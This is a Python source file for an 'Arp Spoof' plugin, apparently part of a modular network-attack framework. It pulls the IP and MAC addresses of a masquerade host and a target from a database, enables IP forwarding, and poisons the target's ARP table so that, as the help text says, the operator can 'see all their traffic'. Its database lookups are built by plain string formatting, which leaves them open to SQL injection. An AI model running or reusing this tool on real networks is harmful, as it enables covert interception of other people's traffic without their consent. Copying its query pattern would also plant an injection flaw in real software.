from util_arp import *
import os
from capability import *

#masq_ip: ip we masquerade as.
#masc_mac: Masqueraded mac address
#source_mac: Our mac address
#Dest IP: target ip
#Dest Mac: target mac address
#ex: arpSpoof("10.0.0.1", "00:0c:29:5f:e7:50", "b8:27:eb:c2:1c:52", "10.0.0.57", "00:0c:29:08:45:1a")
#ex:
#set masq_ip "10.0.0.1"
#set masq_mac "00:0c:29:5f:e7:50"
#set source_mac "b8:27:eb:c2:1c:52"
#set dest_ip "10.0.0.57"
#set dest_mac "00:0c:29:08:45:1a"

class arpSpoof(Capability):

    def __init__(self, core):
        super(arpSpoof, self).__init__(core)
        self.name = "Arp Spoof"
        self.options = {
            "masq" : Option("masq", "", "ID of the computer to masquerade as", True),
            "source": Option("source", "", "ID of the source computer", True),
            "dest": Option("dest", "", "ID of the target", True),
            }
        self.help_text = INFO + "Spoof the arp table of a target with our ip. By forwarding their traffic, we can see all their traffic."

    def exec_command(self, comm):
        self.core.cur.execute(comm)
        return self.core.cur.fetchall()[0][0]

    def getVars(self):
        self.masq_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
        self.masq_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
        self.source_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("source")))
        self.source_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("source")))
        self.dest_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("dest")))
        self.dest_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("dest")))

    def arpGo(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        return arpBegin(self.masq_ip, self.masq_mac, self.source_mac, self.dest_ip, self.dest_mac)
    
    def restore(self):
        self.getVars()
        self.proc.terminate()
        arpEnd(self.masq_ip, self.masq_mac, self.dest_ip, self.dest_mac)


    def launch(self):
        self.getVars()
        self.proc = self.arpGo()
        return self.proc
